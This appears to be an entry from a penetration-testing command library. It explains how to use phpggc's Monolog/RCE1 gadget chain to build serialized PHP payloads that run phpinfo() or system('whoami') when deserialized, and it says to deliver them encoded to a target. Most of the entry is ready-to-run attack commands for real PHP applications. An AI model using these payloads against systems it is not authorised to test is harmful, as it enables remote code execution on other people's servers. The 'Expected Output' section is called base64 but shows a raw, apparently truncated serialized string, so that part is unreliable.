---
type: command
executor: bash
data: phpggc monolog/rce1 'phpinfo();' -s
output: null
platforms:
  - Linux
  - macOS
tags:
  - rce
  - php
  - deserialization
verified: true
validated: true
---

# phpggc-generate-monolog-rce1-simple-payload

## Command

```bash
phpggc monolog/rce1 'phpinfo();' -s
```

## Description

This command uses phpggc to generate a serialized PHP payload exploiting the Monolog/RCE1 gadget chain, executing phpinfo(); upon deserialization. The -s flag enables simple output mode for easy base64 handling. Use this to test PHP deserialization vulnerabilities and gather server info.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| monolog/rce1 | Specifies the Monolog RCE1 gadget chain | Yes |
| 'phpinfo();' | PHP code to execute (single quotes to avoid shell interpretation) | Yes |
| -s | Simple output mode (base64-encoded serialized object) | Yes |

## Examples

### Basic Usage

```bash
phpggc monolog/rce1 'phpinfo();' -s
```

### Advanced Usage

```bash
phpggc monolog/rce1 'system("whoami");' -s > payload.b64
```

## Expected Output

A base64-encoded string like: O:21:"Monolog\Handler\SyslogUdpHandler":1:{s:11:"connection";s:4:"tcp:";}

This represents the serialized gadget; pipe to base64 -d if needed for inspection, but deliver encoded to the target.

## Related

- [[procedures/Exploit-PHP-Deserialization-with-Monolog-RCE1-and-Swiftmailer-FW1-Gadgets]]
- [[commands/phpggc-generate-monolog-rce1-assert-payload]]
